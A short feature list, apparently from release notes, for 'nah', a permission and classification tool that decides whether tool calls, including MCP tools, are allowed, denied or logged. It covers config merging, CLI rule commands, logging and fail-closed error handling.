- YAML config system — global (`~/.config/nah/config.yaml`) + per-project (`.nah.yaml`) with tighten-only merge for supply-chain safety. Taxonomy profiles (full/minimal/none), custom classifiers, configurable safety lists, content patterns, and sensitive paths
- CLI — `nah install/uninstall/update`, `nah test` for dry-run classification across all tools, `nah types/log/config/status`, rule management via `nah allow/deny/classify/trust/forget`
- JSONL decision logging with content redaction, verbosity filtering, 5MB rotation, and `nah log` CLI with tool/decision filters
- Context-aware path resolution — same command gets different decisions based on project boundary, sensitive directories, trusted paths, and database targets
- Fail-closed error handling — internal errors block instead of silently allowing, config parse errors surface actionable hints, 16 formerly-silent error paths now emit stderr diagnostics
- MCP tool support — generic `mcp__*` classification with supply-chain safety (project config cannot reclassify MCP tools)
